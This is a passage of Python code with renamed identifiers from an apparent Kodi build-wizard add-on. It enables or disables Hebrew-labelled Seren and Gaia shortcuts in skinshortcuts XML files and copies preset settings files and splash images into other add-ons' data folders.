		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:552
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:555
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:556
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:560
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:561
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:562
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:580
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:583
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:584
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:587
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:588
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:589
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:607
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:610
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:611
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:613
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:614
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:615
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:633
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:636
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:637
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:639
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:640
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:641
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:659
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:662
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:663
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:666
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:667
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:668
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:686
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:689
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:690
def rdbuildinstall ():#line:693
  try :#line:694
   O0OO00000OOO00O00 =(ADDON .getSetting ("rdbuild"))#line:695
   if O0OO00000OOO00O00 =='true':#line:696
     OOO00000OOOOO0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:697
     OO00O00OOO00O0OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:698
     copyfile (OOO00000OOOOO0O0O ,OO00O00OOO00O0OOO )#line:699
  except :#line:700
     pass #line:701
def rdbuildaddonoff ():#line:704
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:707
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:708
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:709
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:727
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:730
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:731
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:735
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:736
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:737
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:755
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:758
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:759
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:763
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:764
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:765
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:783
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:786
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:787
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:791
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:792
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:793
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:811
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:814
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:815
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:818
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:819
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:820
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:838
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:841
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:842
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:844
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:845
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:846
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:864
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:867
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:868
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:870
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:871
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:872
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:890
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:893
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:894
    OO0O0OOO0OO00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:897
    with open (OO0O0OOO0OO00O000 ,'r')as O0O0OO000OO0OOO0O :#line:898
      OOO0OO0O00O00O0OO =O0O0OO000OO0OOO0O .read ()#line:899
    OOO0OO0O00O00O0OO =OOO0OO0O00O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:917
    with open (OO0O0OOO0OO00O000 ,'w')as O0O0OO000OO0OOO0O :#line:920
      O0O0OO000OO0OOO0O .write (OOO0OO0O00O00O0OO )#line:921
def rdbuildinstalloff ():#line:924
    try :#line:925
       O00OO0OO0OOOO0000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:926
       OOOOOOOOOOOO00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:927
       copyfile (O00OO0OO0OOOO0000 ,OOOOOOOOOOOO00000 )#line:929
       O00OO0OO0OOOO0000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:931
       OOOOOOOOOOOO00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:932
       copyfile (O00OO0OO0OOOO0000 ,OOOOOOOOOOOO00000 )#line:934
       O00OO0OO0OOOO0000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:936
       OOOOOOOOOOOO00000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:937
       copyfile (O00OO0OO0OOOO0000 ,OOOOOOOOOOOO00000 )#line:939
       O00OO0OO0OOOO0000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:942
       OOOOOOOOOOOO00000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:943
       copyfile (O00OO0OO0OOOO0000 ,OOOOOOOOOOOO00000 )#line:945
    except :#line:947
       pass #line:948
def rdbuildaddonON ():#line:955
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:958
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:959
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:977
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:980
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:981
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:985
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:986
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:987
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1005
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1008
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1009
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1014
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1015
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1033
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1036
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1037
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1041
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1042
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1043
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1061
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1064
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1065
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1069
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1070
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1088
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1091
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1092
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1094
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1095
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1096
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1114
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1117
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1118
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1121
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1122
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1140
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1143
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1144
    OOO0O0OOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1147
    with open (OOO0O0OOO000O00OO ,'r')as OO0OO000000O000O0 :#line:1148
      O000O00OO0O00000O =OO0OO000000O000O0 .read ()#line:1149
    O000O00OO0O00000O =O000O00OO0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1167
    with open (OOO0O0OOO000O00OO ,'w')as OO0OO000000O000O0 :#line:1170
      OO0OO000000O000O0 .write (O000O00OO0O00000O )#line:1171
def rdbuildinstallON ():#line:1174
    try :#line:1176
       O00O0O0OO00O000OO =ADDONPATH +"/resources/rd/victory.xml"#line:1177
       O00OOO0000O0O0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1178
       copyfile (O00O0O0OO00O000OO ,O00OOO0000O0O0OO0 )#line:1180
       O00O0O0OO00O000OO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1182
       O00OOO0000O0O0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1183
       copyfile (O00O0O0OO00O000OO ,O00OOO0000O0O0OO0 )#line:1185
       O00O0O0OO00O000OO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1187
       O00OOO0000O0O0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1188
       copyfile (O00O0O0OO00O000OO ,O00OOO0000O0O0OO0 )#line:1190
       O00O0O0OO00O000OO =ADDONPATH +"/resources/rd/Splash.png"#line:1193
       O00OOO0000O0O0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1194
       copyfile (O00O0O0OO00O000OO ,O00OOO0000O0O0OO0 )#line:1196
    except :#line:1198
       pass #line:1199
def rdbuild ():#line:1209
